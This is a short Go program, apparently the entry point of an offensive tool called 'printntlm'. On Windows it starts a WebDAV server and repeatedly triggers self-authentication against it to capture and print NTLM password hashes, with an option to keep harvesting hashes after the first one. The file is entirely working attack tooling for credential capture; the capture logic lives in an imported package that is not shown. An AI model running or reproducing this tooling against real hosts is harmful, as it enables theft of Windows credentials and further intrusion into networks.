// +build windows

package main

import (
	"context"
	"flag"
	"os"
	"time"

	"github.com/audibleblink/printntlm/pkg/printntlm"
)

func main() {
	port := flag.Int("port", 9001, "Port on which to start the WebDAV server")
	persistent := flag.Bool("persistent", false, "Continue listening after first hash is printed")
	flag.Parse()

	srv := printntlm.ServeWebDAV(*port)

	if *persistent {
		select {}
	}

	printntlm.One = true
	printntlm.Stop = make(chan bool)
	for {
		printntlm.SelfDAV(*port)
		select {
		case <-printntlm.Stop:
			ctx, _ := context.WithTimeout(context.Background(), 5*time.Second)
			srv.Shutdown(ctx)
			os.Exit(0)
		default:
		}
	}
}
